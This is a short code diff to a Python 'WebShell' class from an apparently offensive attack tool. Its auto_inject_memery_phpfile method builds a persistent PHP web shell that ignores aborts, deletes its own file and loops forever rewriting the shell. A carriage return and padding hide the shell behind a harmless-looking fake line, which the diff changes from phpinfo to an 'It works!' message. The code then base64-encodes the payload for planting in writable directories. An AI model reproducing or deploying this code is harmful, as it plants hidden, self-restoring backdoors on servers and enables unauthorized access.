@@ -133,7 +133,7 @@ class WebShell():
 
     def auto_inject_memery_phpfile(self, filename, content):
         Log.info("Auto inject memery webshell...")
-        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $shell = '%s'; $fake = '<?php phpinfo();?>'; $content = $shell.'\r'.$fake.str_repeat(' ', strlen($shell) - strlen($fake)).'\n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, content)
+        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $shell = '%s'; $fake = '<?php print_r(\"It works!\")?>'; $content = $shell.'\r'.$fake.str_repeat(' ', strlen($shell) - strlen($fake)).'\n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, content)
         Log.info("Code : [%s]" % (repr(webshell_content)))
         base64_encoded_webshell = webshell_content.encode("base64").replace("\n", "")
         writable_dirs = self.get_writable_directory()
